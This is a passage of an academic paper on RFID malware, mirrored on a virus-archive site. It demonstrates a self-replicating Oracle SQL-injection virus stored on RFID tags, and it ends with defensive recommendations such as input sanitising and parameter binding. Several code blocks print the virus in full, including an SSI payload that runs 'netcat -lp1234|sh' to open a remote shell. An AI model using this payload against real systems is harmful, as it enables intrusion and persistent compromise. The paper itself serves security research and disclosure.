<p>Real-life RFID deployments employ a wide variety of physically distributed RFID readers, access gateways, management interfaces, and databases. To imitate this architecture, we created a modular test platform, that is illustrated in Figure 1. We have used this platform to successfully attack multiple databases (MySQL, Postgres, Oracle, SQL Server); We would describe it all here, but due to lack of space, the non-Oracle viruses (and their variants) will be discussed in a subsequent paper.</p>
<div align="center">
<img src="img/aat/aat02_fig1.gif" alt="Figure 1. RFID Malware Test Platform"/>
<p><strong>Figure 1. RFID Malware Test Platform</strong></p>
</div>
<p>To test Oracle-specific viral functionality, we used a Windows machine running the Oracle 10g database alongside a Philips I.Code/MIFARE RFID reader (with I.Code SLI tags). We also used a Linux machine running the Management Interface (PHP on Apache) and the DB Gateway (CGI executable w/ OCI library, version 10).</p>
<p>A virus is meaningless without a target application, so we chose to continue the supermarket distribution center scenario from Section 4. Our Oracle database is thus configured as follows:</p>
<div class="sql" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333; font-weight: bold;">CREATE</span> <span style="color: #993333; font-weight: bold;">TABLE</span> ContainerContents <span style="color: black;">&#40;</span><br/>
&nbsp; TagID <span style="color: #993333; font-weight: bold;">VARCHAR</span><span style="color: black;">&#40;</span><span style="color: #cc66cc;">16</span><span style="color: black;">&#41;</span><span style="color: #66cc66;">,</span><br/>
&nbsp; NewContents <span style="color: #993333; font-weight: bold;">VARCHAR</span><span style="color: black;">&#40;</span><span style="color: #cc66cc;">128</span><span style="color: black;">&#41;</span><span style="color: #66cc66;">,</span><br/>
&nbsp; OldContents <span style="color: #993333; font-weight: bold;">VARCHAR</span><span style="color: black;">&#40;</span><span style="color: #cc66cc;">128</span><span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#41;</span>;<br/>
&nbsp;</div>
<p>As before, the TagID is the 8-byte RFID tag UID (hex-encoded), and the OldContents column represents the "known" contents of the container, containing the last data value read from the RFID tag. Additionally, the NewContents column represents the refilled cargo contents that still need to be written to the RFID tag. If no update is available, this column will be NULL, and RFID tag data will not be rewritten. A typical view of the ContainerContents is provided in Table 2.</p>
<table border="1" summary="Table 2. ContainerContents table">
<tr><th>TagID</th><th>OldContents</th><th>NewContents</th></tr>
<tr><td>123</td><td>Apples</td><td>Oranges</td></tr>
<tr><td>234</td><td>Pears</td><td>&nbsp;</td></tr>
</table>
<p><strong>Table 2. ContainerContents table</strong></p>
<h4>6.1.2 The Virus</h4>
<p>The following Oracle/SSI virus uses SQL injection to infect the database:</p>
<div class="sql" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">Apples<span style="color: #ff0000;">',NewContents=(select SUBSTR(SQL_TEXT,43,<br/>
127)FROM v$sql WHERE INSTR(SQL_TEXT,'</span><span style="color: #66cc66;">&lt;</span>!<span style="color: black; font-style: italic;">--#exec</span><br/>
cmd<span style="color: #66cc66;">=</span><span style="color: #ff0000;">``</span>netcat <span style="color: #66cc66;">-</span>lp1234<span style="color: #66cc66;">|</span>sh<span style="color: #ff0000;">''</span><span style="color: black; font-style: italic;">--&gt;')&gt;0)--</span><br/>
&nbsp;</div>
<p>Self-replication works in a similar fashion as demonstrated earlier, by utilizing the currently executing query:</p>
<div class="sql" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333; font-weight: bold;">SELECT</span> SUBSTR<span style="color: black;">&#40;</span>SQL_TEXT<span style="color: #66cc66;">,</span><span style="color: #cc66cc;">43</span><span style="color: #66cc66;">,</span><span style="color: #cc66cc;">127</span><span style="color: black;">&#41;</span><span style="color: #993333; font-weight: bold;">FROM</span> v$sql<br/>
<span style="color: #993333; font-weight: bold;">WHERE</span> INSTR<span style="color: black;">&#40;</span>SQL_TEXT<span style="color: #66cc66;">,</span> <span style="color: #66cc66;">...</span>payload<span style="color: #66cc66;">...</span><span style="color: black;">&#41;</span><span style="color: #66cc66;">&gt;</span><span style="color: #cc66cc;">0</span><span style="color: black;">&#41;</span><br/>
&nbsp;</div>
<p>However, this virus also has a bonus compared to the previous one - it has a payload.</p>
<pre class="source">
  &lt;!--#exec cmd=``netcat -lp1234|sh''--&gt;
</pre>
<p>When this Server-Side Include (SSI) is activated by the Management Interface, it executes the system command 'netcat', which opens a backdoor. The backdoor is a remote command shell on port 1234, which lasts for the duration of the SSI execution.</p>
<h4>6.1.3 Database Infection</h4>
<p>When an RFID tag (infected or non-infected) arrives, the RFID Reader Interface reads the tag's ID and data, and these values are stored appropriately. The RFID Reader Interface then constructs queries, which are sent to the Oracle DB via the OCI library. The OldContents column is updated with the newly read tag data, using the following query:</p>
<div class="sql" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333; font-weight: bold;">UPDATE</span> ContainerContents <span style="color: #993333; font-weight: bold;">SET</span> OldContents<span style="color: #66cc66;">=</span><br/>
<span style="color: #ff0000;">'tag.data'</span> <span style="color: #993333; font-weight: bold;">WHERE</span> TagId<span style="color: #66cc66;">=</span><span style="color: #ff0000;">'tag.id'</span>;<br/>
Unexpectedly<span style="color: #66cc66;">,</span> the virus exploits the <span style="color: #993333; font-weight: bold;">UPDATE</span> query:<br/>
<span style="color: #993333; font-weight: bold;">UPDATE</span> ContainerContents <span style="color: #993333; font-weight: bold;">SET</span> OldContents<span style="color: #66cc66;">=</span><br/>
<span style="color: #ff0000;">'Apples'</span><span style="color: #66cc66;">,</span>NewContents<span style="color: #66cc66;">=</span><span style="color: black;">&#40;</span><span style="color: #993333; font-weight: bold;">SELECT</span> SUBSTR<span style="color: black;">&#40;</span><br/>
SQL_TEXT<span style="color: #66cc66;">,</span><span style="color: #cc66cc;">43</span><span style="color: #66cc66;">,</span><span style="color: #cc66cc;">127</span><span style="color: black;">&#41;</span><span style="color: #993333; font-weight: bold;">FROM</span> v$sql <span style="color: #993333; font-weight: bold;">WHERE</span> INSTR<span style="color: black;">&#40;</span><br/>
SQL_TEXT<span style="color: #66cc66;">,</span><span style="color: #ff0000;">'&lt;!--#exec cmd='</span><span style="color: #ff0000;">'netcat -lp1234|<br/>
sh'</span><span style="color: #ff0000;">'--&gt;'</span><span style="color: black;">&#41;</span><span style="color: #66cc66;">&gt;</span><span style="color: #cc66cc;">0</span><span style="color: black;">&#41;</span><span style="color: black; font-style: italic;">--'WHERE TagId='123'</span><br/>
&nbsp;</div>
<table border="1" summary="Table 3. Infected ContainerContents Table">
<tr><td>TagID</td><td>OldContents</td><td>NewContents</td></tr>
<tr><td>123</td><td>Apples</td><td><div class="sql" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">Apples<span style="color: #ff0000;">',NewContents=(select SUBSTR(SQL TEXT,43,127)<br/>
FROM v$sql WHERE INSTR(SQL TEXT,'</span><span style="color: #66cc66;">&lt;</span>!<span style="color: black; font-style: italic;">--#exec cmd=&quot;netcat -lp1234|sh&quot;-- &gt;')&gt;0)--</span></div></td></tr>
<tr><td>234</td><td>Apples</td><td><div class="sql" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">Apples<span style="color: #ff0000;">',NewContents=(select SUBSTR(SQL TEXT,43,127)<br/>
FROM v$sql WHERE INSTR(SQL TEXT,'</span><span style="color: #66cc66;">&lt;</span>!<span style="color: black; font-style: italic;">--#exec cmd=&quot;netcat -lp1234|sh&quot;-- &gt;')&gt;0)--</span></div></td></tr>
</table>
 
<p><strong>Table 3. Infected ContainerContents Table</strong></p>
<p>This results in two changes to the DB: the OldContents column is overwritten with 'Apples', and the NewContents column is overwritten with a copy of the virus. Because the two dashes at the end of the virus comment out the original WHERE clause, these changes occur in every row of the database. Table 3 illustrates what the database table now looks like.</p>
<h4>6.1.4 Payload Activation</h4>
<p>The Management Interface polls the database for current tag data, with the purpose of displaying the OldContents and NewContents columns in a web browser. When the browser loads the virus (from NewContents), it unintentionally activates the Server-Side Include, which causes a backdoor to briefly open on port 1234 of the web server. The attacker now has a command shell on the Management Interface machine, which has the permissions of the Apache webserver. The attacker can then use netcat to further compromise the Management Interface host, and may even compromise the back-end DBs by modifying and issuing unrestricted queries through the web interface.</p>
<h4>6.1.5 Infection of New Tags</h4>
<p>After the database is infected, new (uninfected) tags will eventually arrive at the RFID system. NewContents data is written to these newly arriving RFID tags, using the following query:</p>
<div class="sql" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333; font-weight: bold;">SELECT</span> NewContents <span style="color: #993333; font-weight: bold;">FROM</span> ContainerContents<br/>
<span style="color: #993333; font-weight: bold;">WHERE</span> TagId<span style="color: #66cc66;">=</span><span style="color: #ff0000;">'tag.id'</span>;<br/>
&nbsp;</div>
<p>If NewContents happens to contain viral code, then this is exactly what gets written to the RFID tags. Data written to the RFID tag is then erased by the system, resulting in the removal of the virus from the NewContents column. So in order for the virus to perpetuate, at least one SSI must be executed before all NewContents rows are erased. (But most RFID systems have lots of tags, so this should not be a serious problem.)</p>
<h3>6.2 Lessons Learned</h3>
<p>We have learned the following lessons from implementating our malware ideas on I.Code SLI RFID tags.</p>
<div align="center">
<img src="img/aat/aat02_fig2.gif" alt="Figure 2. The world's first virally-infected RFID tag"/>
<p><strong>Figure 2. The world's first virally-infected RFID tag</strong></p>
</div>
<ol>
<li><strong>Space limitations.</strong> The I.Code SLI tag has 28 blocks of 8-digit (4 byte) hex numbers for a total of 896 bits of data. Using ASCII (7-bit) encoding, 128 characters will fit on a single RFID tag. The Oracle virus is 127 characters; but this small size required tradeoffs. We had to shorten the Oracle "get current query" code to the point that the replication works erratically when two infected RFID tags are read simultaneously. It is also possible to squeeze out extra characters by shortening payloads and DB column names (which is not possible in real-life RFID deployments). It is also worth remembering that as RFID technology improves over time, low-cost tags will have more bits and thus be able to support increasingly complex RFID viruses.
<p>Another solution is to use high-cost RFID tags with larger capacities (i.e. contactless smart cards). For example, the MIFARE DESFire SAM contactless smart card has 72 kBits of storage (~10,000 characters w/ 7-bit ASCII encoding). However, this has the disadvantage that it will only work in certain application scenarios that permit the use of more expensive tags.</p>
<p>A final solution is to spread RFID exploits across multiple tags. The first portion of the exploit code can store SQL code in a DB location or environment variable. A subsequent tag can then add the rest of the code, and then 'PREPARE' and execute the SQL query. However, this solution is problematic both because it uses multiple tags (which may violate application constraints), plus it requires the tags to be read in the correct order. Note that this also will not work for RFID viruses, since the total contents are too large to rewrite to a single RFID tag.</p>
</li>
<li><strong>Quine generality issues.</strong> SQL is Structured Query Language, not Standard Query Language. In other words, SQL is not SQL is not SQL: different databases offer different variants and subsets of the SQL language. This means that even quines written purely in SQL can still be database specific. For this reason, the example SQL quine from Section 5.3 only works on PostgreSQL and not on Oracle. This is due to variances in SQL commands - concat() vs. ||, char vs. chr, etc.. This means that a truly platform independent SQL quine would need to avoid these platform-specific SQL commands.</li>
<li><strong>Self-replication issues.</strong> Utilizing the currently executing query for RFID virus self-replication only works in certain circumstances. MySQL's "SHOW FULL PROCESSLIST" command won't return a useable result set, outside the C API, and PostgreSQL also has a "reporting delay" which results in the current query being specified as '&lt;IDLE&gt;'. On the other hand, utilizing the currently executing query is not a problem with Oracle - "SELECT SUBSTR(SQL TEXT,43,127)FROM v$sql WHERE INSTR(SQL TEXT, ...payload...)>0)" works just fine (assuming administrator privileges).</li>
</ol>
<h2>7 Discussion</h2>
<p>Now that we have demonstrated how to exploit RFID middleware systems, it is important for RFID middlware designers and administrators to understand how to prevent and fix these problems. Concerned parties can protect their systems against RFID malware by taking the following steps[16]:</p>
<ol>
<li><strong>Bounds checking.</strong> Bounds checking is the means of detecting whether or not an index lies within the limits of an array. It is usually performed by the compiler, so as not to induce runtime delays. Programming languages that enforce run-time checking, like Ada, Visual Basic, Java, and C#, do not need bounds checking. However, RFID middleware written in other languages should be compiled with bounds-checking enabled.</li>
<li><strong>Sanitize the input.</strong> Instead of explicitly stripping off special characters, it is easier to only accept data that contains the standard alphanumeric characters (0-9,a-z,A-Z). However, it is not always possible to eliminate all special characters. For example, an RFID tag on a library book might contain the publisher's name, O'Reilly. Explicitly replicating single quotes, or escaping quotes with backslashes will not always help either, because quotes can be represented by Unicode and other encodings. It is best to use built-in "data sanitizing" functions, like pg escape bytea() in Postgres and mysql real escape string() in MySQL.</li>
<li><strong>Disable back-end scripting languages.</strong> RFID middleware that uses HTTP can mitigate script injection by eliminating scripting support from the HTTP client. This may include turning off both client-side (i.e. Javascript, Java, VBScript, ActiveX, Flash) and server-side languages (i.e. Server-Side Includes).</li>
<li><strong>Limit database permissions and segregate users.</strong> The database connection should use the most limited rights possible. Tables should be made read-only or inaccessable, because this limits the damage caused by successful SQL injection attacks. It is also critical to disable the execution of multiple SQL statements in a single query.</li>
<li><strong>Use parameter binding.</strong> Dynamically constructing SQL on-the-fly is dangerous. Instead, it is better to use stored procedures with parameter binding. Bound parameters (using the PREPARE statement) are not treated as a value, making SQL injection attacks more difficult.</li>
<li><strong>Isolate the RFID middleware server.</strong> Compromise of the RFID middleware server should not automatically grant full access to the rest of the back-end infrastructure. Network configurations should therefore limit access to other servers using the usual mechanisms (i.e. DMZs)</li>
<li><strong>Code review.</strong> RFID middleware source code is less likely to contain exploitable bugs if it is frequently scrutinized. "Home grown" RFID middleware should be critically audited. Widely distributed commercial or open-source RFID middleware solutions are less likely to contain bugs.</li>
</ol>
<p>For more information about secure programming practices, see the books 'Secure Coding'[10], 'Building Secure Software'[18], and 'Writing Secure Code' (second edition)[12].</p>
<h2>8 Conclusion</h2>
<p>RFID malware threatens an entire class of Pervasive Computing applications. Developers of the wide variety of RFID-enhanced systems will need to "armor" their systems, to limit the damage that is caused once hackers start experimenting with RFID exploits, RFID worms, and RFID viruses on a larger scale. This paper has underscored the urgency of taking these preventative measures by illustrating the general feasibility of RFID malware, and by presenting the first ever RFID virus.</p>
<p>The spread of RFID malware may launch a new frontier of cat-and-mouse activity, that will play out in the arena of RFID technology. RFID malware may cause other new phenomena to appear; from RFID phishing (tricking RFID reader owners into reading malicious RFID tags) to RFID wardriving (searching for vulnerable RFID readers). People might even develop RFID honeypots to catch the RFID wardrivers! Each of these cases makes it increasingly obvious that the age of RFID innocence has been lost. People will never have the luxury of blindly trusting the data in their cat again.</p>
<h2>9 Acknowledgements</h2>
<p>We would like to thank Patrick Simpson for his time and energy spent on our RFID malware test platform. This work was supported by the Nederlandse Organisatie voor Wetenschappelijk Onderzoek (NWO), as project #600.065.120.03N17.</p>
<h2>References</h2>
<ol>
<li>How to find security holes. http://www.canonical.org/~kragen/security-holes.html.</li>
<li>How to prevent cross-site scripting security issues. http://support.microsoft.com/default.aspx?scid=kb;en-us;Q252985.</li>
<li>Wikipedia - buffer overflow. http://en.wikipedia.org/wiki/Buffer_overflow.</li>
<li>Biometrics deployment of machine readable travel documents. May 2004. http://www.icao.int/mrtd/download/documents/Biometrics%20deployment%20o%f%20Machine%20Readable%20Travel%20Documents%202004.pdf.</li>
<li>C. Anley. Advanced SQL injection in SQL Server applications. http://www.nextgenss.com/papers/advanced_sql_injection.pdf.</li>
<li>Anonymous. Rest in peace. In <em>RFID Buzz</em>. http://www.rfidbuzz.com/news/2005/rest_in_peace.html.</li>
<li>V. R. Basili and B. T. Perricone. Software errors and complexity: An empirical investigation. Commun. ACM, 27(1):42-52, 1984.</li>
<li>S. Bono, M. Green, A. Stubblefield, A. Juels, A. Rubin, and M. Szydlo. Security analysis of a cryptographically-enabled RFID device. In <em>14th USENIX Security Symposium</em>, pages 1-16, Baltimore, Maryland, USA, July-August 2005. USENIX.</li>
<li>B. Fabian, O. G&uuml;nther, and S. Spiekermann. Security analysis of the object name service for RFID. In <em>Security, Privacy and Trust in Pervasive and Ubiquitous Computing</em>, July 2005.</li>
<li>M. G. Graff and K. R. Van Wyk. <em>Secure Coding: Principles and Practices</em>. O'Reilly, 2003.</li>
<li>D. R. Hofstadter. <em>Godel, Escher, Bach: An Eternal Golden Braid</em>. Basic Books, Inc., New York, NY, USA, 1979.</li>
<li>M. Howard and D. LeBlanc. <em>Writing Secure Code</em>. Microsoft Press, 2002.</li>
<li>N. Jorgensen. Self documenting program in SQL. http://www.droptable.com/archive478-2005-5-25456.html.</li>
<li>Z. Kfir and A. Wool. Picking virtual pockets using relay attacks on contactless smartcard systems. In <em>1st Intl. Conf. on Security and Privacy for Emerging Areas in Communication Networks</em>, Sep 2005. http://eprint.iacr.org/.</li>
<li>D. Madore. Quines (self-replicating programs). http://www.madore.org/~david/computers/quine.html.</li>
<li>D. Rajesh. Advanced concepts to prevent SQL injection. http://www.csharpcorner.com/UploadFile/rajeshdg/Page107142005052957AM/P%age1.aspx?ArticleID=631d8221-64ed-4db7-b81b-8ba3082cb496.</li>
<li>M. R. Rieback, B. Crispo, and A. S. Tanenbaum. RFID Guardian: A battery-powered mobile device for RFID privacy management. In <em>Proc. 10th Australasian Conf. on Information Security and Privacy (ACISP 2005), volume 3574 of LNCS</em>, pages 184-194, July 2005.</li>
<li>J. Viega and G. McGraw. <em>Building Secure Software: How to Avoid Security Problems the Right Way</em>. Addison-Wesley Professional, 2001.</li>
<li>N. Weaver, V. Paxson, S. Staniford, and R. Cunningham. <a href="/lib/anw01.html">A taxonomy of computer worms</a>. In <em>First Workshop on Rapid Malcode (WORM)</em>, 2003.</li>
<li>M. Weiser. The computer for the twenty-first century. <em>Scientific American</em>, pages 94-100, 1991. http://www.ubiq.com/hypertext/weiser/SciAmDraft3.html.</li>
</ol>
<hr/>
<p><a name="f1" href="#b1">1</a> See: http://en.wikipedia.org/wiki/All your base are belong to us</p>
<p><a name="f2" href="#b2">2</a> The German anti-RFID group FoeBuD sells "RFID absorber foil" that is both portable and fashionable</p>
<p><a name="f3" href="#b3">3</a> By RFID middleware, we are referring to the combination of RFID reader interfaces, application servers, and back-end databases.</p>
<p><a name="f4" href="#b4">4</a> This RFID virus is specifically written to work with Oracle SQL*Plus. The CHR(10) is a linefeed, required for the query to execute properly.</p>
<p><a name="f5" href="#b5">5</a> RFID viruses using quines tend to have a large number of characters, so the attacks described here are better suited to contactless smartcard systems.</p>
[<a style="" href="/lib/?lang=EN&amp;index=VT#aat02">Back to index</a>] [<a href="/lib/aat02.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=aat02">de</a><a href="/lib/index.php?lang=en&amp;id=aat02">en</a><a href="/lib/index.php?lang=es&amp;id=aat02">es</a><a href="/lib/index.php?lang=it&amp;id=aat02">it</a><a href="/lib/index.php?lang=fr&amp;id=aat02">fr</a><a href="/lib/index.php?lang=pl&amp;id=aat02">pl</a><a href="/lib/index.php?lang=ru&amp;id=aat02">ru</a><a href="/lib/index.php?lang=ua&amp;id=aat02">ua</a></div>
</body>
</html>
